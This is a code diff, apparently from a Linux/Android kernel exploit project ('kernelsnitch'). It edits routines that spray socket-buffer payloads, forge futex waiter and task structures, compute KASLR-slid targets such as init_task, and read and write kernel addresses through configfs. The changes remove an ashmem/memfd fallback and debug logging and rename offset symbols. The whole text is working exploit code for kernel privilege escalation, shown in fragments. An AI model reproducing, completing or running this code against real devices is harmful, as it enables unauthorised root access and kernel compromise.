@@ -1,7 +1,6 @@
 #include "common.h"
 #include "kernelsnitch/kernelsnitch.h"
-#include <dlfcn.h>
-#include <sys/syscall.h>
+
 static struct kernelsnitch_shared_state *ks;
 static size_t mm_objs_per_slab;
 static unsigned char *skb_buf;
@@ -246,8 +245,8 @@ void log_startup_context(void) {
              getpid(), (unsigned long long)P0_PHYS_OFFSET,
              (unsigned long long)P0_KERNEL_PHYS_LOAD,
              (unsigned long long)P0_KERNEL_PHYS_DELTA,
-             (unsigned long long)SLIDE_NFULNL_LOGGER,
-             (unsigned long long)SLIDE_RANDOM_BOOT_ID_DATA,
+             (unsigned long long)SLIDE_NFULNL_LOGGER_NAME,
+             (unsigned long long)SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR,
              (unsigned long long)SLIDE_INIT_TASK,
              (unsigned long long)SLIDE_ROOT_TASK_GROUP,
              (unsigned long long)SLIDE_SYSCTL_BOOTID);
@@ -336,26 +335,6 @@ void init_ashmem_path(void) {
 }
 
 int open_ashmem_device(void) {
-  int fd = open(ashmem_path, O_RDWR | O_CLOEXEC);
-  if (fd >= 0) return fd;
-  
-  fd = open("/dev/ashmem", O_RDWR | O_CLOEXEC);
-  if (fd >= 0) return fd;
-  
-  fd = syscall(SYS_memfd_create, "RMG", 0);
-  if (fd >= 0) return fd;
-  
-  void *handle = dlopen("libcutils.so.0", RTLD_NOW);
-  if (handle) {
-    int (*create_region)(const char *, size_t) = dlsym(handle, "ashmem_create_region");
-    if (create_region) {
-      fd = create_region("RMG", 4096);
-      dlclose(handle);
-      if (fd >= 0) return fd;
-    }
-    dlclose(handle);
-  }
-  
   return SYSCHK(open(ashmem_path, O_RDWR | O_CLOEXEC));
 }
 
@@ -440,7 +419,7 @@ int try_put_blob_zero_at(int fd, const unsigned char *blob, size_t pos) {
 }
 
 int try_set_ashmem_name_blob(int fd, const unsigned char *blob, size_t len) {
-  pr_info("ashmem_name_blob zero attempt\n"); if (try_put_blob_no_zeros(fd, blob, len) != 0) {
+  if (try_put_blob_no_zeros(fd, blob, len) != 0) {
     return -1;
   }
 
@@ -606,8 +585,8 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
         }
 #else
         uintptr_t offset = slide_bank_offsets[slot];
-        parent = SLIDE_NFULNL_LOGGER + offset;
-        target = SLIDE_RANDOM_BOOT_ID_DATA + offset;
+        parent = SLIDE_NFULNL_LOGGER_OBJECT + offset;
+        target = SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR + offset;
 #endif
         slide_bank_parents[slot] = parent;
         slide_bank_targets[slot] = target;
@@ -693,9 +672,9 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
   uint64_t pi_top_task = text_addr(INIT_TASK);
   uint32_t waiter_prio = FAKE_WAITER_PRIO;
   if (payload_mode == PAGE_PAYLOAD_SLIDE) {
-    write_pc = SLIDE_NFULNL_LOGGER + slide_p0_offset;
+    write_pc = SLIDE_NFULNL_LOGGER_OBJECT + slide_p0_offset;
     write_right = 0;
-    write_left = SLIDE_RANDOM_BOOT_ID_DATA + slide_p0_offset;
+    write_left = SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR + slide_p0_offset;
 #if defined(SLIDE_USE_FAKE_TASK) && SLIDE_USE_FAKE_TASK
     waiter_task = fake_task;
     task_group = 0;
@@ -993,7 +972,7 @@ ssize_t configfs_write_once(int fd, uintptr_t target, const void *data, size_t l
   }
 
   errno = 0;
-  ssize_t wr = pwrite(fd, data, len, 0); pr_info("pwrite ret=%zd errno=%d len=%zu\n", wr, errno, len);
+  ssize_t wr = pwrite(fd, data, len, 0);
   return wr;
 }
 
@@ -1013,7 +992,7 @@ ssize_t configfs_read_once(int fd, uintptr_t target, void *data, size_t len) {
   }
 
   errno = 0;
-  ssize_t rd = pread(fd, data, len, pos); pr_info("pread ret=%zd errno=%d len=%zu pos=%ld\n", rd, errno, len, (long)pos);
+  ssize_t rd = pread(fd, data, len, pos);
   return rd;
 }
 
